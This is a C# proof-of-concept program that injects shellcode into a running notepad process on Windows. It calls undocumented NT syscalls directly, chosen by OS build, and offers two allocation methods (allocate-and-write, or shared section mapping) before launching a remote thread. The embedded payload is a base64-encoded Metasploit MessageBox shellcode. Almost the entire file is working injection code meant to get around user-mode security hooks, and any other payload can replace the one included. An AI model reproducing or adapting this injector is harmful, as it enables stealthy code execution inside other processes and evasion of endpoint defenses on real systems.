using directInjectorPOC;
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace directInjectorPOC
{
    public class Program
    {
        public const int ALLOCWRITE = 1;
        public const int OPENSEC = 2;

        static unsafe void Main(string[] args)
        {

            string osV = getOsVers();

            Inject("notepad", osV, OPENSEC);
            Console.WriteLine("[+] Injection done. Press any key to exit");
            Console.ReadKey();
        }

        public static string getOsVers()
        {
            nativeStructs.OSVERSIONINFOEXW osInfo = new nativeStructs.OSVERSIONINFOEXW();
            osInfo.dwOSVersionInfoSize = Marshal.SizeOf(osInfo);
            nativeStructs.RtlGetVersion(ref osInfo);
            string osV = "";

            switch (osInfo.dwMajorVersion)
            {
                case 10:
                    switch (osInfo.dwBuildNumber)
                    {
                        case 10240:
                            osV = "win10-1507";
                            break;
                        case 10586:
                            osV = "win10-1511";
                            break;
                        case 14393:
                            osV = "win10-1607";
                            break;
                        case 15063:
                            osV = "win10-1703";
                            break;
                        case 16299:
                            osV = "win10-1709";
                            break;
                        case 17134:
                            osV = "win10-1803";
                            break;
                        case 17763:
                            osV = "win10-1809";
                            break;
                        case var _ when (osInfo.dwBuildNumber >= 18362):
                            osV = "win10-1903-9";
                            break;
                    }
                    break;
                case 6:
                    switch (osInfo.dwMinorVersion)
                    {
                        case 1:
                            osV = "w7-08";
                            break;
                        case 2:
                            osV = "win8-12";
                            break;
                        case 3:
                            osV = "win8.1-12r2";
                            break;
                    }
                    break;
                default:
                    osV = "";
                    break;
            }
            return osV;
        }

        public static unsafe int Inject(string processName, string os, int method)
        {

            Process targetProcess = Process.GetProcessesByName(processName)[0];

            int id = targetProcess.Id;
            Console.WriteLine("Injecting shellcode on pid " + id);

            //msf messagebox x64
            string s = @"/EiB5PD////o0AAAAEFRQVBSUVZIMdJlSItSYD5Ii1IYPkiLUiA+SItyUD5ID7dKSk0xyUgxwKw8YXwCLCBBwckNQQHB4u1SQVE+SItSID6LQjxIAdA+i4CIAAAASIXAdG9IAdBQPotIGD5Ei0AgSQHQ41xI/8k+QYs0iEgB1k0xyUgxwKxBwckNQQHBOOB18T5MA0wkCEU50XXWWD5Ei0AkSQHQZj5BiwxIPkSLQBxJAdA+QYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVo+SIsS6Un///9dScfBAAAAAD5IjZX+AAAAPkyNhQMBAABIMclBukWDVgf/1UgxyUG68LWiVv/VZ2F0bwBNZXNzYWdlQm94AA==";
            byte[] shellcode = Convert.FromBase64String(s);


            nativeStructs.CLIENT_ID clientid = new nativeStructs.CLIENT_ID();
            clientid.UniqueProcess = new IntPtr(id);
            clientid.UniqueThread = IntPtr.Zero;

            IntPtr bufferReal = IntPtr.Zero;
            IntPtr procHandle = IntPtr.Zero;
            syscalls.ZwOpenProcess10(ref procHandle, nativeStructs.ProcessAccessFlags.All, new nativeStructs.OBJECT_ATTRIBUTES(), ref clientid, os);
            IntPtr remoteAddr = new IntPtr();

            switch (method)
            {
                case ALLOCWRITE:
                    Console.WriteLine("[+] Using ALLOCWRITE method to allocate our shellcode in the remote process");
                    UIntPtr sz = new UIntPtr(Convert.ToUInt32(shellcode.Length));

                    syscalls.NtAllocateVirtualMemory10(procHandle, ref remoteAddr, new IntPtr(0), ref sz, nativeStructs.MEM_COMMIT | nativeStructs.MEM_RESERVE, nativeStructs.PAGE_EXECUTE_READWRITE, os);

                    IntPtr written = IntPtr.Zero;
                    IntPtr unmanagedPointer = Marshal.AllocHGlobal(shellcode.Length);
                    Marshal.Copy(shellcode, 0, unmanagedPointer, shellcode.Length);
                    syscalls.ZwWriteVirtualMemory10(procHandle, ref remoteAddr, unmanagedPointer, Convert.ToUInt32(shellcode.Length), ref written, os);

                    break;
                case OPENSEC:
                    Console.WriteLine("[+] Using OPENSEC method to allocate our shellcode in the remote process");
                    //create required structs/variables
                    IntPtr localAddr = new IntPtr(null);
                    Process thisProc = Process.GetCurrentProcess();
                    nativeStructs.LARGE_INTEGER liVal = new nativeStructs.LARGE_INTEGER();
                    uint size_ = getLowPart((uint)shellcode.Length);
                    liVal.LowPart = size_;

                    //create local section
                    IntPtr section_ = new IntPtr();
                    IntPtr viewSize = (IntPtr)(shellcode.Length);
                    long status = (int)syscalls.NtCreateSection(ref section_, 0x10000000, (IntPtr)0, ref liVal, nativeStructs.PAGE_EXECUTE_READWRITE, 0x08000000, (IntPtr)0, os);

                    //map local section
                    status = (int)syscalls.NtMapViewOfSection(section_, thisProc.Handle, ref localAddr, (IntPtr)0, (IntPtr)0, (IntPtr)0, ref viewSize, 1, 0, nativeStructs.PAGE_EXECUTE_READWRITE, os);

                    //map remote section
                    status = (int)syscalls.NtMapViewOfSection(section_, procHandle, ref remoteAddr, (IntPtr)0, (IntPtr)0, (IntPtr)0, ref viewSize, 1, 0, nativeStructs.PAGE_EXECUTE_READWRITE, os);

                    //copy shellcode to local section
                    Marshal.Copy(shellcode, 0, localAddr, shellcode.Length);

                    break;
            }



            //bool is64bit = Environment.Is64BitProcess;
            int temp1 = 0, temp2 = 0;
            nativeStructs.NtCreateThreadExBuffer nb = new nativeStructs.NtCreateThreadExBuffer
            {
                Size = sizeof(nativeStructs.NtCreateThreadExBuffer),
                Unknown1 = 0x10003,
                Unknown2 = 0x8,
                Unknown3 = new IntPtr(&temp2),
                Unknown4 = 0,
                Unknown5 = 0x10004,
                Unknown6 = 4,
                Unknown7 = new IntPtr(&temp1),
                Unknown8 = 0,
            };
            IntPtr hRemoteThread;
            //syscalls.NtCreateThreadEx(out hRemoteThread, 0x1FFFFF, IntPtr.Zero, procHandle, buffer, IntPtr.Zero, 0, 0, (is64bit ? 0xFFFF : 0u), (is64bit ? 0xFFFF : 0u), (is64bit ? IntPtr.Zero : new IntPtr(&nb)), os);
            //if OPENSEC then a thread is created in a remote process with the remote section addr as starting point. 
            //if ALLOCWRITE then a thread is created poiting to a memory address with our shellcode
            syscalls.NtCreateThreadEx(out hRemoteThread, 0x1FFFFF, IntPtr.Zero, procHandle, remoteAddr, IntPtr.Zero, 0, 0, 0xFFFF, 0xFFFF, IntPtr.Zero, os);

            return 0;
        }

        public static uint getLowPart(uint size)
        {
            nativeStructs.SYSTEM_INFO info = new nativeStructs.SYSTEM_INFO();
            nativeStructs.GetSystemInfo(ref info);
            return (info.dwPageSize - size % info.dwPageSize) + size;
        }

    }
}